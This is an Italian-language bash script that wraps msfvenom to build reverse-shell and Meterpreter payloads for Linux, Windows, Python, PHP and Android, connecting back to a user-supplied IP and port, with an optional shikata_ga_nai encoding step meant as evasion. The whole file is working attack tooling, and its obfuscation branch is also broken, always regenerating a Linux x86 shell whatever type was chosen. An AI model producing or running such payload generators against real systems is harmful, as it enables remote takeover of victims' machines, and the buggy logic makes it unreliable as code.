#!/bin/bash

# Funzione per generare il payload
generate_payload() {
    echo "Creazione del payload..."

    # Chiedere all'utente il nome del payload
    read -p "Inserisci il nome del payload (senza estensione): " payload_name

    destination_path="/home/parrot/ScriptNetwork"

    # Chiedere all'utente il tipo di payload
    echo "Scegli il tipo di payload:"
    echo "[1] linux/x86/shell_reverse_tcp (Linux)"
    echo "[2] windows/shell_reverse_tcp (Windows)"
    echo "[3] linux/x86/meterpreter_reverse_tcp (Linux)"
    echo "[4] windows/meterpreter/reverse_http (Windows)"
    echo "[5] windows/meterpreter/reverse_tcp (Windows)"
    echo "[6] linux/x64/meterpreter_reverse_http (Linux)"
    echo "[7] linux/x86/meterpreter_reverse_http (Linux)"
    echo "[8] python/meterpreter/reverse_tcp (Python)"
    echo "[9] php/meterpreter/reverse_tcp (PHP)"
    echo "[10] android/meterpreter/reverse_tcp (Android)" 
    echo "-----------------------"
    read -p "Tipo di Payload: " payload_type

    # Chiedere l'IP e la porta
    read -p "Inserisci il tuo indirizzo IP locale (es. 192.168.1.10): " local_ip
    read -p "Inserisci la porta per il payload (es. 4444): " port

    # Chiedere se applicare offuscamento
    read -p "Vuoi applicare l'offuscamento automatico? (yes/no): " obfuscation

    # Chiedere la piattaforma
    read -p "Che piattaforma?"

    # Chiedere l'estensione del file
    read -p "Inserisci l'estensione del file (es. .elf per Linux, .exe per Windows): " extension

    # Creare il payload in base al tipo selezionato
    case $payload_type in
        1)
            echo "Generazione di un reverse shell per Linux..."
            payload_file="$payload_name$extension"
            msfvenom -p linux/x86/shell_reverse_tcp LHOST=$local_ip LPORT=$port -f elf -o $payload_file
            ;;
        2)
            echo "Generazione di un reverse shell per Windows..."
            payload_file="$payload_name$extension"
            msfvenom -p windows/shell_reverse_tcp LHOST=$local_ip LPORT=$port -f exe -o $payload_file
            ;;
        3)
            echo "Generazione di un Meterpreter per Linux..."
            payload_file="$payload_name$extension"
            msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$local_ip LPORT=$port -f elf -o $payload_file
            ;;
        4)
            echo "Generazione di un Meterpreter per Windows..."
            payload_file="$payload_name$extension"
            msfvenom -p windows/meterpreter/reverse_http LHOST=$local_ip LPORT=$port -f exe -o $payload_file
            ;;
        5)
            echo "Generazione di un Meterpreter per Windows..."
            payload_file="$payload_name$extension"
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$local_ip LPORT=$port -f exe -o $payload_file
            ;;

        6)
            echo "Generazione di un Meterpreter per Linux..."
            payload_file="$payload_name$extension"
            msfvenom -p linux/x64/meterpreter_reverse_http LHOST=$local_ip LPORT=$port -f elf -o $payload_file
            ;;
             
        7)
            echo "Generazione di meterpreter per Linux"
            payload_file="$payload_name$extension"
            msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$local_ip LPORT=$port -f elf -o $payload_file
            ;;

        8) 
            echo "Generazione di meterpreter python"
            payload_file="$payload_name$extension"
            msfvenom -p python/meterpreter/reverse_tcp LHOST=$local_ip LPORT=$port -f raw -o $payload_file
            ;;

        9)
            echo "Generazione di meterpreter php"
            payload_file="$payload_name$extension"
            msfvenom -p php/meterpreter/reverse_tcp LHOST=$local_ip LPORT=$port -f raw -o $payload_file
            ;; 

        10)
            echo "Generazione di meterpreter android"
            payload_file="$payload_name$extension"
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$local_ip LPORT=$port -f raw -o $payload_file
            ;; 

            
        *)
            echo "Tipo di payload non valido!"
            exit 1
            ;;
    esac

    # Applicare offuscamento se richiesto
    if [ "$obfuscation" == "yes" ]; then
        echo "Applicazione dell'offuscamento al payload..."
        mv $payload_file "${payload_name}_obfuscated$extension"
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$local_ip LPORT=$port -f elf -o "${payload_name}_obfuscated$extension" --encoder x86/shikata_ga_nai
    fi

    echo "Payload generato con successo: ${payload_name}${extension}"
}

# Chiamare la funzione di generazione del payload
generate_payload
